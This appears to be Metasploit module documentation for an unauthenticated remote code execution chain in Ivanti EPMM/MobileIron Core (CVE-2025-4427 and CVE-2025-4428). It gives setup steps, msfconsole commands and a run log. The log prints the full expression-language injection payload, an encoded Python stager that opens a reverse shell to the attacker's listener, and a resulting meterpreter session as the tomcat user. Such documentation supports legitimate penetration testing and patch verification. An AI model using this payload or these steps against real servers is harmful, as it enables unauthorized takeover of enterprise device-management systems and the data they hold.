## Vulnerable Application
This module exploits an unauthenticated remote code execution exploit chain for Ivanti EPMM,
tracked as CVE-2025-4427 and CVE-2025-4428. An authentication flaw permits unauthenticated
access to an administrator web API endpoint, which allows for code execution via expression
language injection. This module executes in the context of the 'tomcat' user. This module
should also work on many versions of MobileIron Core (rebranded as Ivanti EPMM).

## Testing
To set up a test environment:
1. Set up an Ivanti EPMM or MobileIron Core VM appliance.
2. Configure basic networking and confirm that the web service on port 443 is reachable.
3. Follow the verification steps below.

## Options
No custom options exist for this module.

## Verification Steps
1. Start msfconsole
2. `use exploit/multi/http/ivanti_epmm_rce_cve_2025_4427_4428`
3. `set RHOSTS <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_PORT>`
5. `run`

## Scenarios
### Ivanti EPMM (MobileIron Core) Linux Target
```
msf6 exploit(multi/http/ivanti_epmm_rce_cve_2025_4427_4428) > show options

Module options (exploit/multi/http/ivanti_epmm_rce_cve_2025_4427_4428):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, so
                                         cks4, socks5, socks5h, http
   RHOSTS     10.5.132.244     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                         asploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             yes       Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to Ivanti EPMM
   VHOST                       no        HTTP server virtual host


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.5.135.201     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Default



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/ivanti_epmm_rce_cve_2025_4427_4428) > run
[*] Started reverse TCP handler on 10.5.135.201:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Attempting to execute payload
[*] Sending template payload: ${''.getClass().forName('java.util.Scanner').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('python3 -c exec(__import__("base64").b64decode("ZXhlYyhfX2ltcG9ydF9fKCd6bGliJykuZGVjb21wcmVzcyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoX19pbXBvcnRfXygnY29kZWNzJykuZ2V0ZW5jb2RlcigndXRmLTgnKSgnZU5vOVVFMUx4REFRUFRlL0lyY2tHRU83dG50WXJDRGlRVVFFMTV1SXRNbW9vV2tTa3F4V3hmOXVReGJuTU1PYmVmUG1ROC9laFlTamt4TWsvbTMweU1jaHdyYmxNWVdEVER6cEdkQ3JDM2pCMnVJdzJEZWdUYzEycUVyaGEvVlY3RXV6S0lGdStCSHY3Njl1WC9hUEQ5ZVhkeXp6aEhUV2dreVVrcVlXbldqT09yR3BHOExiMVZpbWpBR0dDVld3U1BBcGErZmhJaG9BVHp1R1RGOTJFZ2ZyQnpsUmNuRkRlQlFCNUFkZEJaN3FaNlQ2SXpZTWZiNXJBOWlBcFlxZG0xVk9uZnhYVDB1YUlWaEEwbnkyVUNEZDdBUEVTTXNIeExodGMxSkJadklmRXNrdS9qTDBCOGd3WHZBPScpWzBdKSkp"))').getInputStream()).useDelimiter('%5C%5CA').next()}
[*] Sending stage (24768 bytes) to 10.5.132.244
[*] Meterpreter session 2 opened (10.5.135.201:4444 -> 10.5.132.244:50322) at 2025-06-03 13:38:16 -0500
meterpreter > sysinfo
Computer        : ivanti.example.local
OS              : Linux 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter > getuid
Server username: tomcat
meterpreter > exit

```
